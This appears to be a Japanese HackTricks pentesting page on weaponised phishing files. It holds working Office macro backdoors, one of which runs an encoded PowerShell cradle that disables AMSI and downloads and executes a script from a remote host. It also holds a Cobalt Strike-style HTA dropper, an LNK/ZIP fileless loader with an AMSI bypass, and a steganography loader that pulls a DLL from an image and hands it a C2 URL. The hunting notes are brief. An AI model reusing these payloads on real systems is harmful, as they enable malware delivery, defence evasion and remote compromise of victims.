# Phishing ファイルとドキュメント

{{#include ../../banners/hacktricks-training.md}}

## Office ドキュメント

Microsoft Word はファイルを開く前にファイルのデータ検証を行います。データ検証は OfficeOpenXML 標準に基づくデータ構造の識別という形で行われます。データ構造の識別中にエラーが発生した場合、解析対象のファイルは開かれません。

通常、macros を含む Word ファイルは `.docm` 拡張子を使用します。しかし、拡張子を変更してファイル名を変更しても、macro 実行機能を維持することが可能です。\
例えば、RTF ファイルは設計上 macros をサポートしませんが、DOCM ファイルを RTF にリネームすると Microsoft Word がそれを処理し、macro を実行できるようになります。\
同じ内部構造とメカニズムは Microsoft Office Suite（Excel、PowerPoint など）の全てのソフトウェアにも当てはまります。

以下のコマンドで、いくつかの Office プログラムが実行する拡張子を確認できます:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### 外部画像の読み込み

以下を選択: _Insert --> Quick Parts --> Field_\
_**カテゴリ**: Links and References、**フィールド名**: includePicture、**ファイル名またはURL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### マクロのバックドア

マクロを使ってドキュメントから任意のコードを実行することが可能である。

#### 自動実行関数

それらが一般的であればあるほど、AVに検知される可能性が高くなる。

- AutoOpen()
- Document_Open()

#### マクロのコード例
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### メタデータを手動で削除

**File > Info > Inspect Document > Inspect Document** に移動すると Document Inspector が表示されます。**Inspect** をクリックし、**Document Properties and Personal Information** の横にある **Remove All** をクリックします。

#### Doc Extension

作業が終わったら、**Save as type** ドロップダウンを選択し、形式を **`.docx`** から **Word 97-2003 `.doc`** に変更します。\
これは **`.docx`** の内部に macro を保存できないためで、macro 有効な **`.docm`** 拡張子には忌避感（例: サムネイルアイコンに大きな `!` が表示され、一部の web/email ゲートウェイで完全にブロックされる）があります。したがって、このレガシーな **`.doc`** 拡張子が最良の妥協点です。

#### 悪意のあるマクロ生成ツール

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

HTA は、HTML とスクリプト言語（例: **VBScript** や **JScript**）を組み合わせた Windows プログラムです。ユーザーインターフェースを生成し、ブラウザのセキュリティモデルの制約を受けない「完全に信頼された」アプリケーションとして実行されます。

HTA は **`mshta.exe`** を使って実行され、通常は **installed** とともに **Internet Explorer** によって提供されます。これにより **`mshta` dependant on IE** となるため、IE がアンインストールされている場合、HTA は実行できません。
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM 認証の強制

NTLM 認証を**「リモートで」強制する**方法はいくつかあります。例えば、ユーザがアクセスするメールや HTML に**不可視の画像**を追加する（HTTP MitM を使うこともあり得ます）。あるいは被害者に、フォルダを**開くだけで**認証を**トリガーする**ような**ファイルのアドレス**を送る、などです。

**以下のページでこれらのアイデアやその他を確認してください：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

ハッシュや認証情報を盗むだけでなく、**NTLM relay attacks** を実行できる点を忘れないでください：

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

非常に効果的なキャンペーンでは、2つの正規のデコイドキュメント（PDF/DOCX）と悪意のある .lnk を含む ZIP を配布します。トリックは、実際の PowerShell ローダーが ZIP の生バイト列の中にユニークなマーカーの後ろに格納されており、.lnk がそれを切り出して完全にメモリ上で実行することです。

典型的に .lnk の PowerShell ワンライナーで実装されるフロー：

1) Desktop, Downloads, Documents, %TEMP%, %ProgramData% およびカレントワーキングディレクトリの親など、一般的なパスで元の ZIP を検索する。  
2) ZIP のバイトを読み、ハードコードされたマーカー（例: xFIQCV）を見つける。マーカー以降のすべてが埋め込まれた PowerShell ペイロードである。  
3) ZIP を %ProgramData% にコピーし、そこに展開してデコイの .docx を開き、正規に見せかける。  
4) 現在のプロセスで AMSI をバイパスする: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) 次段（例: すべての # 文字を削除するなど）をデオブフスクしてメモリ内で実行する。

組み込みステージを切り出して実行するための PowerShell スケルトン例：
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
注記
- 配信は信頼された PaaS サブドメイン（例: *.herokuapp.com）を悪用することが多く、payloads を条件付きで配信する（IP/UA に基づき無害な ZIPs を返す）ことがある。
- 次のステージでは、base64/XOR shellcode を復号し、Reflection.Emit + VirtualAlloc 経由で実行してディスク痕跡を最小化することが多い。

Persistence used in the same chain
- COM TypeLib hijacking による Microsoft Web Browser control の悪用 — IE/Explorer やそれを埋め込むアプリが payload を自動的に再起動するようにする。詳細と即使用可能なコマンドは以下参照:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files に、アーカイブデータの末尾に追記された ASCII マーカー文字列（例: xFIQCV）が含まれる。
- .lnk が親/ユーザフォルダを列挙して ZIP を探し、decoy document を開く。
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- 長時間稼働するビジネススレッドが信頼された PaaS ドメインでホストされたリンクで終わる。

## 画像内の Steganography-delimited payloads (PowerShell stager)

最近の loader chains は難読化された JavaScript/VBS を配信し、それが Base64 PowerShell stager をデコードして実行する。  
その stager は画像（多くは GIF）をダウンロードし、一意の start/end markers の間にプレーンテキストとして隠された Base64-encoded .NET DLL を含む。スクリプトはこれらのデリミタ（実際に確認された例: «<<sudo_png>> … <<sudo_odt>>>»）を検索し、間のテキストを抽出して Base64 デコードしてバイト化し、アセンブリをメモリ上にロードして既知のエントリーメソッドを C2 URL と共に呼び出す。

ワークフロー
- Stage 1: Archived JS/VBS dropper → 埋め込まれた Base64 をデコード → PowerShell stager を -nop -w hidden -ep bypass で起動。
- Stage 2: PowerShell stager → 画像をダウンロードし、marker-delimited Base64 を切り出して .NET DLL をメモリ上にロードし、そのメソッド（例: VAI）を C2 URL とオプションを渡して呼び出す。
- Stage 3: Loader は最終 payload を取得し、通常は process hollowing で信頼されたバイナリ（一般的には MSBuild.exe）に注入する。process hollowing と trusted utility proxy execution の詳細は以下参照:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

ノート
- これは ATT&CK T1027.003 (steganography/marker-hiding) に該当します。マーカーはキャンペーンごとに異なります。
- AMSI/ETW のバイパスや文字列のデオブフスケーションは、アセンブリをロードする前に一般的に適用されます。
- ハンティング: ダウンロードされた画像を既知のデリミタでスキャンする；画像にアクセスして即座に Base64 ブロブをデコードする PowerShell を特定する。

See also stego tools and carving techniques:

{{#ref}}
../../crypto-and-stego/stego-tricks.md
{{#endref}}

## JS/VBS ドロッパー → Base64 PowerShell ステージング

繰り返し見られる初期段階としては、アーカイブ内に格納された小さく強く難読化された `.js` または `.vbs` があり、その唯一の目的は埋め込まれた Base64 文字列をデコードし、`-nop -w hidden -ep bypass` オプションで PowerShell を起動して HTTPS 経由で次の段階をブートストラップすることです。

基本的なロジック（抽象）:
- 自身のファイル内容を読み取る
- ジャンク文字列の間にある Base64 ブロブを見つける
- ASCII の PowerShell スクリプトにデコードする
- `wscript.exe`/`cscript.exe` を介して `powershell.exe` を起動して実行する

ハンティングの手掛かり
- アーカイブされた JS/VBS 添付ファイルがコマンドラインに `-enc`/`FromBase64String` を含む `powershell.exe` を生成するケース。
- ユーザの temp パスから `wscript.exe` が `powershell.exe -nop -w hidden` を起動するケース。

## Windows から NTLM ハッシュを盗むファイル

以下のページを確認してください: **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
